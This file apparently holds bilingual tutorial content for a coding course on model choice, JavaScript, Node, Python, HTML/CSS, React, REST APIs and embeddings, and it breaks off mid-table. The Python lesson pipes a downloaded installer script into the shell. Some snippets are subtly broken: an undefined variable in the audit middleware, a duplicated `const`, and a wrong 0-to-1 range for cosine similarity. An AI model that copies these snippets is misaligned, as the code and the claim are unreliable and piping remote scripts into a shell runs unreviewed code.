> 💡 **The key**: Use premium models to CREATE code, economical models to SERVE users.

---

## Common mistakes

| Mistake | Consequence | Solution |
|---------|-------------|----------|
| Using Opus 4.5 in production | Very high costs | Use Haiku or Flash |
| Using small model for coding | Poor quality code | Invest in good dev model |
| Ignoring context | "Forgets" conversation | Choose model with adequate context |
| Not using OpenRouter | Locked to one provider | Centralize with OpenRouter |

---

## Practice

→ [Chatbot with Gemini](/en/cooking/chatbot-gemini) — Use Gemini Flash for free
→ [API with Node](/en/cooking/api-rest-node) — Backend for your model

---

## Useful links

- 📖 [OpenRouter - Available Models](https://openrouter.ai/models)
- 📖 [Ollama - Models Library](https://ollama.com/library)
- 📖 [Artificial Analysis - LLM Benchmarks](https://artificialanalysis.ai/)
- 📖 [SWE-bench Leaderboard](https://www.swebench.com/)
- 📖 [Anthropic Pricing](https://www.anthropic.com/pricing)
- 📖 [Google AI Pricing](https://ai.google.dev/pricing)
    `,
  },
  // ===== COCINERO LEVEL =====
  javascript: {
    contentEs: `
## El lenguaje de la web

JavaScript es el único lenguaje que corre nativamente en navegadores. TypeScript agrega tipos para menos errores.

---

## JavaScript vs TypeScript

| Aspecto | JavaScript | TypeScript |
|---------|------------|------------|
| Tipos | Dinámicos | Estáticos |
| Errores | En runtime | En desarrollo |
| Archivos | \`.js\` | \`.ts\` |
| Compilación | No necesita | Necesita \`tsc\` |

> 💡 **Recomendación**: Usa TypeScript para proyectos serios.

---

## Conceptos fundamentales

### Variables

\`\`\`typescript
const nombre = "Ana"     // No cambia
let edad = 25            // Puede cambiar
// var está obsoleto, no lo uses
\`\`\`

### Funciones

\`\`\`typescript
// Arrow function (preferida)
const sumar = (a: number, b: number): number => a + b

// Función tradicional
function multiplicar(a: number, b: number): number {
  return a * b
}
\`\`\`

### Arrays

\`\`\`typescript
const frutas = ['manzana', 'pera', 'uva']

frutas.map(f => f.toUpperCase())     // Transforma
frutas.filter(f => f.length > 4)     // Filtra
frutas.find(f => f === 'pera')       // Busca uno
\`\`\`

### Objetos

\`\`\`typescript
interface Usuario {
  nombre: string
  edad: number
  email?: string  // Opcional
}

const usuario: Usuario = {
  nombre: "Ana",
  edad: 25
}
\`\`\`

---

## Async/Await

\`\`\`typescript
// Llamar API
async function obtenerUsuario(id: string) {
  const res = await fetch(\`/api/users/\${id}\`)
  const data = await res.json()
  return data
}

// Usar
const usuario = await obtenerUsuario('123')
\`\`\`

---

## Practica

→ [Todo App con React](/es/cooking/react-todo)

---

## Enlaces útiles

- 📖 [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/)
- 🎓 [JavaScript.info](https://javascript.info/)
    `,
    contentEn: `
## The language of the web

JavaScript is the only language that runs natively in browsers. TypeScript adds types for fewer errors.

---

## JavaScript vs TypeScript

| Aspect | JavaScript | TypeScript |
|--------|------------|------------|
| Types | Dynamic | Static |
| Errors | At runtime | During development |
| Files | \`.js\` | \`.ts\` |
| Compilation | Not needed | Needs \`tsc\` |

> 💡 **Recommendation**: Use TypeScript for serious projects.

---

## Fundamental concepts

### Variables

\`\`\`typescript
const name = "Ana"       // Doesn't change
let age = 25             // Can change
// var is obsolete, don't use it
\`\`\`

### Functions

\`\`\`typescript
// Arrow function (preferred)
const add = (a: number, b: number): number => a + b

// Traditional function
function multiply(a: number, b: number): number {
  return a * b
}
\`\`\`

### Arrays

\`\`\`typescript
const fruits = ['apple', 'pear', 'grape']

fruits.map(f => f.toUpperCase())     // Transform
fruits.filter(f => f.length > 4)     // Filter
fruits.find(f => f === 'pear')       // Find one
\`\`\`

### Objects

\`\`\`typescript
interface User {
  name: string
  age: number
  email?: string  // Optional
}

const user: User = {
  name: "Ana",
  age: 25
}
\`\`\`

---

## Async/Await

\`\`\`typescript
// Call API
async function getUser(id: string) {
  const res = await fetch(\`/api/users/\${id}\`)
  const data = await res.json()
  return data
}

// Use
const user = await getUser('123')
\`\`\`

---

## Practice

→ [Todo App with React](/en/cooking/react-todo)

---

## Useful links

- 📖 [TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/)
- 🎓 [JavaScript.info](https://javascript.info/)
    `,
  },
  nodejs: {
    contentEs: `
## JavaScript fuera del navegador

Node.js te permite ejecutar JavaScript en servidores, scripts y herramientas CLI.

---

## Instalación

| Sistema | Comando |
|---------|---------|
| **macOS** | \`brew install node\` |
| **Windows** | \`winget install OpenJS.NodeJS\` |
| **Linux** | \`sudo apt install nodejs npm\` |

\`\`\`bash
# Verificar instalación
node --version
npm --version
\`\`\`

---

## npm vs pnpm vs yarn

| Gestor | Velocidad | Espacio | Comando |
|--------|-----------|---------|---------|
| **npm** | Normal | Normal | \`npm install\` |
| **pnpm** | Rápido | Eficiente | \`pnpm install\` |
| **yarn** | Rápido | Normal | \`yarn\` |

> 💡 **Recomendación**: pnpm para proyectos nuevos.

\`\`\`bash
# Instalar pnpm
npm install -g pnpm
\`\`\`

---

## Crear proyecto

\`\`\`bash
# Inicializar
mkdir mi-proyecto && cd mi-proyecto
pnpm init

# Agregar dependencia
pnpm add express

# Agregar dev dependency
pnpm add -D typescript @types/node
\`\`\`

---

## package.json

\`\`\`json
{
  "name": "mi-proyecto",
  "version": "1.0.0",
  "scripts": {
    "dev": "node index.js",
    "build": "tsc",
    "start": "node dist/index.js"
  },
  "dependencies": {
    "express": "^4.18.0"
  },
  "devDependencies": {
    "typescript": "^5.0.0"
  }
}
\`\`\`

\`\`\`bash
# Ejecutar scripts
pnpm dev
pnpm build
\`\`\`

---

## Ejemplo: Servidor básico

\`\`\`javascript
import express from 'express'

const app = express()
app.get('/', (req, res) => res.send('Hola!'))
app.listen(3000, () => console.log('http://localhost:3000'))
\`\`\`

---

## Practica

→ [API REST con Express](/es/cooking/api-rest-basic)

---

## Enlaces útiles

- 📖 [Node.js Docs](https://nodejs.org/docs/)
- 📖 [pnpm Docs](https://pnpm.io/)
    `,
    contentEn: `
## JavaScript outside the browser

Node.js lets you run JavaScript on servers, scripts, and CLI tools.

---

## Installation

| System | Command |
|--------|---------|
| **macOS** | \`brew install node\` |
| **Windows** | \`winget install OpenJS.NodeJS\` |
| **Linux** | \`sudo apt install nodejs npm\` |

\`\`\`bash
# Verify installation
node --version
npm --version
\`\`\`

---

## npm vs pnpm vs yarn

| Manager | Speed | Space | Command |
|---------|-------|-------|---------|
| **npm** | Normal | Normal | \`npm install\` |
| **pnpm** | Fast | Efficient | \`pnpm install\` |
| **yarn** | Fast | Normal | \`yarn\` |

> 💡 **Recommendation**: pnpm for new projects.

\`\`\`bash
# Install pnpm
npm install -g pnpm
\`\`\`

---

## Create project

\`\`\`bash
# Initialize
mkdir my-project && cd my-project
pnpm init

# Add dependency
pnpm add express

# Add dev dependency
pnpm add -D typescript @types/node
\`\`\`

---

## package.json

\`\`\`json
{
  "name": "my-project",
  "version": "1.0.0",
  "scripts": {
    "dev": "node index.js",
    "build": "tsc",
    "start": "node dist/index.js"
  },
  "dependencies": {
    "express": "^4.18.0"
  },
  "devDependencies": {
    "typescript": "^5.0.0"
  }
}
\`\`\`

\`\`\`bash
# Run scripts
pnpm dev
pnpm build
\`\`\`

---

## Example: Basic server

\`\`\`javascript
import express from 'express'

const app = express()
app.get('/', (req, res) => res.send('Hello!'))
app.listen(3000, () => console.log('http://localhost:3000'))
\`\`\`

---

## Practice

→ [REST API with Express](/en/cooking/api-rest-basic)

---

## Useful links

- 📖 [Node.js Docs](https://nodejs.org/docs/)
- 📖 [pnpm Docs](https://pnpm.io/)
    `,
  },
  python: {
    contentEs: `
## El lenguaje versátil

Python es excelente para scripts, IA, datos y backends. Fácil de leer y aprender.

---

## Instalación

| Sistema | Comando |
|---------|---------|
| **macOS** | \`brew install python\` |
| **Windows** | \`winget install Python.Python.3\` |
| **Linux** | Ya viene instalado |

\`\`\`bash
# Verificar
python3 --version
\`\`\`

---

## uv: El gestor moderno

\`uv\` es el nuevo gestor de paquetes Python (10x más rápido que pip).

\`\`\`bash
# Instalar uv
curl -LsSf https://astral.sh/uv/install.sh | sh

# Crear proyecto
uv init mi-proyecto
cd mi-proyecto

# Agregar dependencia
uv add requests

# Ejecutar
uv run python main.py
\`\`\`

---

## Conceptos básicos

### Variables

\`\`\`python
nombre = "Ana"
edad = 25
es_activo = True
\`\`\`

### Funciones

\`\`\`python
def saludar(nombre: str) -> str:
    return f"Hola, {nombre}!"

# Llamar
mensaje = saludar("Ana")
\`\`\`

### Listas

\`\`\`python
frutas = ["manzana", "pera", "uva"]

# List comprehension
mayusculas = [f.upper() for f in frutas]

# Filtrar
largas = [f for f in frutas if len(f) > 4]
\`\`\`

### Diccionarios

\`\`\`python
usuario = {
    "nombre": "Ana",
    "edad": 25,
    "email": "ana@email.com"
}

print(usuario["nombre"])
\`\`\`

---

## Virtual environments

\`\`\`bash
# Con uv (recomendado)
uv venv
source .venv/bin/activate  # macOS/Linux
.venv\\Scripts\\activate     # Windows

# Con venv tradicional
python3 -m venv .venv
\`\`\`

---

## Practica

→ [CLI Tool con Python](/es/cooking/python-cli)

---

## Enlaces útiles

- 📖 [Python Docs](https://docs.python.org/3/)
- 📖 [uv Docs](https://docs.astral.sh/uv/)
    `,
    contentEn: `
## The versatile language

Python is excellent for scripts, AI, data, and backends. Easy to read and learn.

---

## Installation

| System | Command |
|--------|---------|
| **macOS** | \`brew install python\` |
| **Windows** | \`winget install Python.Python.3\` |
| **Linux** | Already installed |

\`\`\`bash
# Verify
python3 --version
\`\`\`

---

## uv: The modern manager

\`uv\` is the new Python package manager (10x faster than pip).

\`\`\`bash
# Install uv
curl -LsSf https://astral.sh/uv/install.sh | sh

# Create project
uv init my-project
cd my-project

# Add dependency
uv add requests

# Run
uv run python main.py
\`\`\`

---

## Basic concepts

### Variables

\`\`\`python
name = "Ana"
age = 25
is_active = True
\`\`\`

### Functions

\`\`\`python
def greet(name: str) -> str:
    return f"Hello, {name}!"

# Call
message = greet("Ana")
\`\`\`

### Lists

\`\`\`python
fruits = ["apple", "pear", "grape"]

# List comprehension
uppercase = [f.upper() for f in fruits]

# Filter
long_ones = [f for f in fruits if len(f) > 4]
\`\`\`

### Dictionaries

\`\`\`python
user = {
    "name": "Ana",
    "age": 25,
    "email": "ana@email.com"
}

print(user["name"])
\`\`\`

---

## Virtual environments

\`\`\`bash
# With uv (recommended)
uv venv
source .venv/bin/activate  # macOS/Linux
.venv\\Scripts\\activate     # Windows

# With traditional venv
python3 -m venv .venv
\`\`\`

---

## Practice

→ [CLI Tool with Python](/en/cooking/python-cli)

---

## Useful links

- 📖 [Python Docs](https://docs.python.org/3/)
- 📖 [uv Docs](https://docs.astral.sh/uv/)
    `,
  },
  'html-css': {
    contentEs: `
## La estructura y el estilo

HTML define la estructura. CSS define cómo se ve. Juntos crean interfaces visuales.

---

## HTML esencial

\`\`\`html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mi Página</title>
</head>
<body>
  <header>
    <h1>Bienvenido</h1>
  </header>
  <main>
    <p>Contenido principal</p>
  </main>
  <footer>
    <p>© 2026</p>
  </footer>
</body>
</html>
\`\`\`

---

## Tags importantes

| Tag | Uso |
|-----|-----|
| \`<div>\` | Contenedor genérico |
| \`<span>\` | Texto inline |
| \`<a href="">\` | Enlaces |
| \`<img src="">\` | Imágenes |
| \`<button>\` | Botones |
| \`<input>\` | Campos de formulario |
| \`<form>\` | Formularios |

---

## CSS moderno

\`\`\`css
/* Variables */
:root {
  --color-primary: #3b82f6;
  --spacing: 1rem;
}

/* Estilos */
.container {
  max-width: 1200px;
  margin: 0 auto;
  padding: var(--spacing);
}

.button {
  background: var(--color-primary);
  color: white;
  padding: 0.5rem 1rem;
  border-radius: 0.5rem;
  border: none;
  cursor: pointer;
}
\`\`\`

---

## Flexbox

\`\`\`css
.flex-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 1rem;
}
\`\`\`

---

## Grid

\`\`\`css
.grid-container {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 1rem;
}
\`\`\`

---

## Tailwind CSS

En lugar de escribir CSS, usa clases utilitarias:

\`\`\`html
<button class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
  Click me
</button>
\`\`\`

> 💡 **Recomendación**: Usa Tailwind para proyectos nuevos.

---

## Practica

→ [Landing Page Responsive](/es/cooking/landing-page)

---

## Enlaces útiles

- 📖 [MDN Web Docs](https://developer.mozilla.org/)
- 📖 [Tailwind CSS Docs](https://tailwindcss.com/docs)
    `,
    contentEn: `
## Structure and style

HTML defines structure. CSS defines how it looks. Together they create visual interfaces.

---

## Essential HTML

\`\`\`html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>My Page</title>
</head>
<body>
  <header>
    <h1>Welcome</h1>
  </header>
  <main>
    <p>Main content</p>
  </main>
  <footer>
    <p>© 2026</p>
  </footer>
</body>
</html>
\`\`\`

---

## Important tags

| Tag | Use |
|-----|-----|
| \`<div>\` | Generic container |
| \`<span>\` | Inline text |
| \`<a href="">\` | Links |
| \`<img src="">\` | Images |
| \`<button>\` | Buttons |
| \`<input>\` | Form fields |
| \`<form>\` | Forms |

---

## Modern CSS

\`\`\`css
/* Variables */
:root {
  --color-primary: #3b82f6;
  --spacing: 1rem;
}

/* Styles */
.container {
  max-width: 1200px;
  margin: 0 auto;
  padding: var(--spacing);
}

.button {
  background: var(--color-primary);
  color: white;
  padding: 0.5rem 1rem;
  border-radius: 0.5rem;
  border: none;
  cursor: pointer;
}
\`\`\`

---

## Flexbox

\`\`\`css
.flex-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 1rem;
}
\`\`\`

---

## Grid

\`\`\`css
.grid-container {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 1rem;
}
\`\`\`

---

## Tailwind CSS

Instead of writing CSS, use utility classes:

\`\`\`html
<button class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
  Click me
</button>
\`\`\`

> 💡 **Recommendation**: Use Tailwind for new projects.

---

## Practice

→ [Responsive Landing Page](/en/cooking/landing-page)

---

## Useful links

- 📖 [MDN Web Docs](https://developer.mozilla.org/)
- 📖 [Tailwind CSS Docs](https://tailwindcss.com/docs)
    `,
  },
  react: {
    contentEs: `
## Componentes que reaccionan

React es una librería para construir interfaces de usuario con componentes reutilizables.

---

## Conceptos clave

| Concepto | Qué es |
|----------|--------|
| **Componente** | Pieza de UI reutilizable |
| **Props** | Datos que recibe el componente |
| **State** | Datos internos del componente |
| **Hook** | Función para agregar funcionalidad |

---

## Tu primer componente

\`\`\`tsx
// Componente funcional
function Saludo({ nombre }: { nombre: string }) {
  return <h1>Hola, {nombre}!</h1>
}

// Uso
<Saludo nombre="Ana" />
\`\`\`

---

## useState: Estado local

\`\`\`tsx
import { useState } from 'react'

function Contador() {
  const [cuenta, setCuenta] = useState(0)

  return (
    <div>
      <p>Cuenta: {cuenta}</p>
      <button onClick={() => setCuenta(cuenta + 1)}>
        +1
      </button>
    </div>
  )
}
\`\`\`

---

## useEffect: Efectos secundarios

\`\`\`tsx
import { useState, useEffect } from 'react'

function Datos() {
  const [data, setData] = useState(null)

  useEffect(() => {
    fetch('/api/data')
      .then(res => res.json())
      .then(setData)
  }, []) // [] = solo al montar

  return <div>{JSON.stringify(data)}</div>
}
\`\`\`

---

## Patrón común: Lista

\`\`\`tsx
interface Item {
  id: string
  nombre: string
}

function Lista({ items }: { items: Item[] }) {
  return (
    <ul>
      {items.map(item => (
        <li key={item.id}>{item.nombre}</li>
      ))}
    </ul>
  )
}
\`\`\`

---

## Formularios

\`\`\`tsx
function Formulario() {
  const [texto, setTexto] = useState('')

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    console.log('Enviado:', texto)
  }

  return (
    <form onSubmit={handleSubmit}>
      <input
        value={texto}
        onChange={e => setTexto(e.target.value)}
      />
      <button type="submit">Enviar</button>
    </form>
  )
}
\`\`\`

---

## Practica

→ [Todo App con React](/es/cooking/react-todo)

---

## Enlaces útiles

- 📖 [React Docs](https://react.dev/)
- 🎓 [React Tutorial](https://react.dev/learn)
    `,
    contentEn: `
## Components that react

React is a library for building user interfaces with reusable components.

---

## Key concepts

| Concept | What it is |
|---------|------------|
| **Component** | Reusable UI piece |
| **Props** | Data the component receives |
| **State** | Internal component data |
| **Hook** | Function to add functionality |

---

## Your first component

\`\`\`tsx
// Functional component
function Greeting({ name }: { name: string }) {
  return <h1>Hello, {name}!</h1>
}

// Usage
<Greeting name="Ana" />
\`\`\`

---

## useState: Local state

\`\`\`tsx
import { useState } from 'react'

function Counter() {
  const [count, setCount] = useState(0)

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>
        +1
      </button>
    </div>
  )
}
\`\`\`

---

## useEffect: Side effects

\`\`\`tsx
import { useState, useEffect } from 'react'

function Data() {
  const [data, setData] = useState(null)

  useEffect(() => {
    fetch('/api/data')
      .then(res => res.json())
      .then(setData)
  }, []) // [] = only on mount

  return <div>{JSON.stringify(data)}</div>
}
\`\`\`

---

## Common pattern: List

\`\`\`tsx
interface Item {
  id: string
  name: string
}

function List({ items }: { items: Item[] }) {
  return (
    <ul>
      {items.map(item => (
        <li key={item.id}>{item.name}</li>
      ))}
    </ul>
  )
}
\`\`\`

---

## Forms

\`\`\`tsx
function Form() {
  const [text, setText] = useState('')

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    console.log('Submitted:', text)
  }

  return (
    <form onSubmit={handleSubmit}>
      <input
        value={text}
        onChange={e => setText(e.target.value)}
      />
      <button type="submit">Submit</button>
    </form>
  )
}
\`\`\`

---

## Practice

→ [Todo App with React](/en/cooking/react-todo)

---

## Useful links

- 📖 [React Docs](https://react.dev/)
- 🎓 [React Tutorial](https://react.dev/learn)
    `,
  },
  apis: {
    contentEs: `
## Comunicación entre sistemas

REST APIs permiten que aplicaciones se comuniquen usando HTTP.

---

## Métodos HTTP

| Método | Acción | Ejemplo |
|--------|--------|---------|
| **GET** | Obtener datos | Listar usuarios |
| **POST** | Crear nuevo | Crear usuario |
| **PUT** | Actualizar todo | Actualizar perfil |
| **PATCH** | Actualizar parcial | Cambiar email |
| **DELETE** | Eliminar | Borrar usuario |

---

## Estructura de URL

\`\`\`
GET    /api/users          # Listar todos
GET    /api/users/123      # Obtener uno
POST   /api/users          # Crear
PUT    /api/users/123      # Actualizar
DELETE /api/users/123      # Eliminar
\`\`\`

---

## Fetch API

\`\`\`typescript
// GET
const res = await fetch('/api/users')
const users = await res.json()

// POST
const res = await fetch('/api/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ nombre: 'Ana', email: 'ana@email.com' })
})

// DELETE
await fetch('/api/users/123', { method: 'DELETE' })
\`\`\`

---

## Códigos de respuesta

| Código | Significado |
|--------|-------------|
| **200** | OK |
| **201** | Creado |
| **400** | Error del cliente |
| **401** | No autorizado |
| **404** | No encontrado |
| **500** | Error del servidor |

---

## Headers comunes

\`\`\`typescript
const headers = {
  'Content-Type': 'application/json',
  'Authorization': 'Bearer tu-token',
  'Accept': 'application/json'
}
\`\`\`

---

## Manejo de errores

\`\`\`typescript
async function fetchData() {
  const res = await fetch('/api/data')

  if (!res.ok) {
    throw new Error(\`Error: \${res.status}\`)
  }

  return res.json()
}
\`\`\`

---

## 🔐 APIs para Fintech: Seguridad Obligatoria

Las APIs que manejan datos financieros tienen requisitos especiales de seguridad.

### Headers de Seguridad Obligatorios

\`\`\`typescript
// Headers que TODA API financiera debe incluir
const securityHeaders = {
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block',
  'X-Request-ID': crypto.randomUUID(), // Trazabilidad
  'Cache-Control': 'no-store', // No cachear datos sensibles
}
\`\`\`

### Autenticación para Open Banking

| Método | Uso | Cuándo |
|--------|-----|--------|
| **OAuth 2.0 + PKCE** | Apps móviles | Conexión con bancos |
| **mTLS** (mutual TLS) | Server-to-server | APIs interbancarias |
| **API Keys + HMAC** | Webhooks | Verificar origen |
| **JWT con rotación** | Sesiones | Usuarios finales |

### Logging para Auditoría

En fintech, "no logueamos eso" no es respuesta aceptable ante un regulador.

\`\`\`typescript
// Middleware de auditoría
const auditMiddleware = (req, res, next) => {
  const auditLog = {
    requestId: req.headers['x-request-id'] || crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    method: req.method,
    path: req.path,
    userId: req.user?.id,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
  }

  // Log al inicio
  logger.info('API_REQUEST', auditLog)

  // Log al finalizar (con duración)
  res.on('finish', () => {
    logger.info('API_RESPONSE', {
      ...auditLog,
      statusCode: res.statusCode,
      duration: Date.now() - startTime
    })
  })

  next()
}
\`\`\`

### Rate Limiting por Endpoint

\`\`\`typescript
const rateLimits = {
  '/api/login':     { limit: 5,  window: '1m' },  // Anti brute-force
  '/api/transfer':  { limit: 10, window: '1h' },  // Límite fraude
  '/api/balance':   { limit: 60, window: '1m' },  // Uso normal
  '/api/verify':    { limit: 3,  window: '1d' },  // APIs costosas (KYC)
}
\`\`\`

---

## Practica

→ [API REST con Express](/es/cooking/api-rest-basic)

---

## Enlaces útiles

- 📖 [HTTP Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
- 📖 [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)
- 📖 [OWASP API Security](https://owasp.org/www-project-api-security/)
    `,
    contentEn: `
## Communication between systems

REST APIs allow applications to communicate using HTTP.

---

## HTTP Methods

| Method | Action | Example |
|--------|--------|---------|
| **GET** | Get data | List users |
| **POST** | Create new | Create user |
| **PUT** | Update all | Update profile |
| **PATCH** | Partial update | Change email |
| **DELETE** | Remove | Delete user |

---

## URL Structure

\`\`\`
GET    /api/users          # List all
GET    /api/users/123      # Get one
POST   /api/users          # Create
PUT    /api/users/123      # Update
DELETE /api/users/123      # Delete
\`\`\`

---

## Fetch API

\`\`\`typescript
// GET
const res = await fetch('/api/users')
const users = await res.json()

// POST
const res = await fetch('/api/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Ana', email: 'ana@email.com' })
})

// DELETE
await fetch('/api/users/123', { method: 'DELETE' })
\`\`\`

---

## Response codes

| Code | Meaning |
|------|---------|
| **200** | OK |
| **201** | Created |
| **400** | Client error |
| **401** | Unauthorized |
| **404** | Not found |
| **500** | Server error |

---

## Common headers

\`\`\`typescript
const headers = {
  'Content-Type': 'application/json',
  'Authorization': 'Bearer your-token',
  'Accept': 'application/json'
}
\`\`\`

---

## Error handling

\`\`\`typescript
async function fetchData() {
  const res = await fetch('/api/data')

  if (!res.ok) {
    throw new Error(\`Error: \${res.status}\`)
  }

  return res.json()
}
\`\`\`

---

## 🔐 Fintech APIs: Mandatory Security

APIs handling financial data have special security requirements.

### Required Security Headers

\`\`\`typescript
// Headers that EVERY financial API must include
const securityHeaders = {
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block',
  'X-Request-ID': crypto.randomUUID(), // Traceability
  'Cache-Control': 'no-store', // Don't cache sensitive data
}
\`\`\`

### Open Banking Authentication

| Method | Use | When |
|--------|-----|------|
| **OAuth 2.0 + PKCE** | Mobile apps | Bank connections |
| **mTLS** (mutual TLS) | Server-to-server | Interbank APIs |
| **API Keys + HMAC** | Webhooks | Verify origin |
| **JWT with rotation** | Sessions | End users |

### Audit Logging

In fintech, "we don't log that" is not an acceptable answer to a regulator.

\`\`\`typescript
// Audit middleware
const auditMiddleware = (req, res, next) => {
  const auditLog = {
    requestId: req.headers['x-request-id'] || crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    method: req.method,
    path: req.path,
    userId: req.user?.id,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
  }

  // Log at start
  logger.info('API_REQUEST', auditLog)

  // Log on finish (with duration)
  res.on('finish', () => {
    logger.info('API_RESPONSE', {
      ...auditLog,
      statusCode: res.statusCode,
      duration: Date.now() - startTime
    })
  })

  next()
}
\`\`\`

### Rate Limiting by Endpoint

\`\`\`typescript
const rateLimits = {
  '/api/login':     { limit: 5,  window: '1m' },  // Anti brute-force
  '/api/transfer':  { limit: 10, window: '1h' },  // Fraud limit
  '/api/balance':   { limit: 60, window: '1m' },  // Normal use
  '/api/verify':    { limit: 3,  window: '1d' },  // Expensive APIs (KYC)
}
\`\`\`

---

## Practice

→ [REST API with Express](/en/cooking/api-rest-basic)

---

## Useful links

- 📖 [HTTP Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
- 📖 [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)
- 📖 [OWASP API Security](https://owasp.org/www-project-api-security/)
    `,
  },
  embeddings: {
    contentEs: `
## Texto como vectores

Los embeddings convierten texto en números (vectores). Esto permite buscar por significado, no solo por palabras exactas.

---

## ¿Qué es un embedding?

\`\`\`
"Hola mundo" → [0.12, -0.34, 0.56, ..., 0.78]
                     (1536 dimensiones)
\`\`\`

Textos similares tienen vectores similares.

---

## Casos de uso

| Uso | Ejemplo |
|-----|---------|
| **Búsqueda semántica** | "comida italiana" encuentra "pizza" |
| **Recomendaciones** | Productos similares |
| **RAG** | Encontrar contexto relevante para LLMs |
| **Clasificación** | Agrupar textos por tema |

---

## Modelos de embeddings

| Modelo | Dimensiones | Proveedor |
|--------|-------------|-----------|
| \`text-embedding-3-small\` | 1536 | OpenAI |
| \`text-embedding-3-large\` | 3072 | OpenAI |
| \`voyage-3\` | 1024 | Voyage AI |
| \`all-MiniLM-L6-v2\` | 384 | HuggingFace (local) |

---

## Ejemplo con OpenAI

\`\`\`typescript
import OpenAI from 'openai'

const openai = new OpenAI()

const response = await openai.embeddings.create({
  model: 'text-embedding-3-small',
  input: 'Tu texto aquí'
})

const vector = response.data[0].embedding
// [0.12, -0.34, 0.56, ...]
\`\`\`

---

## Similitud coseno

Mide qué tan similares son dos vectores (0 a 1):

\`\`\`typescript
function cosineSimilarity(a: number[], b: number[]): number {
  let dot = 0, normA = 0, normB = 0
  for (let i = 0; i < a.length; i++) {
    dot += a[i] * b[i]
    normA += a[i] * a[i]
    normB += b[i] * b[i]
  }
  return dot / (Math.sqrt(normA) * Math.sqrt(normB))
}
\`\`\`

---

## Bases de datos vectoriales

Para almacenar y buscar embeddings eficientemente:

| DB | Tipo | Ideal para |
|----|------|------------|
| **Pinecone** | Cloud | Producción |
| **Supabase pgvector** | Cloud | Full-stack |
| **ChromaDB** | Local | Desarrollo |

---

## 🎯 Caso Real: Detección de Anomalías

Los embeddings son ideales para detectar comportamientos inusuales en fintech.

### Ejemplo: Transacciones Sospechosas

\`\`\`typescript
// Vectorizar el comportamiento "normal" del usuario
const perfilNormal = await embedTransaction({
  montoPromedio: 150,
  horarioUsual: '9am-6pm',
  ubicaciones: ['Ciudad de México', 'Guadalajara'],
  comerciosFrecuentes: ['Amazon', 'Uber', 'Starbucks']
})

// Nueva transacción
const transaccion = await embedTransaction({
  monto: 5000,
  hora: '3:47am',
  ubicacion: 'Lagos, Nigeria',
  comercio: 'CryptoExchange_xyz'
})

// Calcular similitud
const similitud = cosineSimilarity(perfilNormal, transaccion)

if (similitud < 0.3) {
  await flagForReview(transaccion) // 🚨 Revisar manualmente
  await notifyUser('Detectamos actividad inusual')
}
\`\`\`

### Aplicaciones en Fintech

| Caso | Input | Output |
|------|-------|--------|
| **Detección de fraude** | Historial + transacción nueva | Score de riesgo 0-100 |
| **Scoring crediticio** | Datos del perfil | Similitud con perfiles "buenos" |
| **KYC automatizado** | Documentos + comportamiento | Match de identidad |
| **Segmentación** | Historial de usuario | Cluster de comportamiento |

> 💡 Los embeddings capturan patrones que las reglas tradicionales no pueden detectar.

---

## Practica

→ [Búsqueda Vectorial](/es/cooking/vector-search)

---

## Enlaces útiles

- 📖 [OpenAI Embeddings](https://platform.openai.com/docs/guides/embeddings)
- 📖 [Pinecone Docs](https://docs.pinecone.io/)
    `,
    contentEn: `
## Text as vectors

Embeddings convert text into numbers (vectors). This allows searching by meaning, not just exact words.

---

## What is an embedding?

\`\`\`
"Hello world" → [0.12, -0.34, 0.56, ..., 0.78]
                     (1536 dimensions)
\`\`\`

Similar texts have similar vectors.

---

## Use cases

| Use | Example |
|-----|---------|
| **Semantic search** | "italian food" finds "pizza" |
| **Recommendations** | Similar products |
| **RAG** | Find relevant context for LLMs |
| **Classification** | Group texts by topic |

---

## Embedding models

| Model | Dimensions | Provider |
|-------|------------|----------|
| \`text-embedding-3-small\` | 1536 | OpenAI |
| \`text-embedding-3-large\` | 3072 | OpenAI |
| \`voyage-3\` | 1024 | Voyage AI |
| \`all-MiniLM-L6-v2\` | 384 | HuggingFace (local) |

---

## Example with OpenAI

\`\`\`typescript
import OpenAI from 'openai'

const openai = new OpenAI()

const response = await openai.embeddings.create({
  model: 'text-embedding-3-small',
  input: 'Your text here'
})

const vector = response.data[0].embedding
// [0.12, -0.34, 0.56, ...]
\`\`\`

---

## Cosine similarity

Measures how similar two vectors are (0 to 1):

\`\`\`typescript
function cosineSimilarity(a: number[], b: number[]): number {
  let dot = 0, normA = 0, normB = 0
  for (let i = 0; i < a.length; i++) {
    dot += a[i] * b[i]
    normA += a[i] * a[i]
    normB += b[i] * b[i]
  }
  return dot / (Math.sqrt(normA) * Math.sqrt(normB))
}
\`\`\`

---

## Vector databases

To store and search embeddings efficiently:

| DB | Type | Ideal for |
|----|------|-----------|
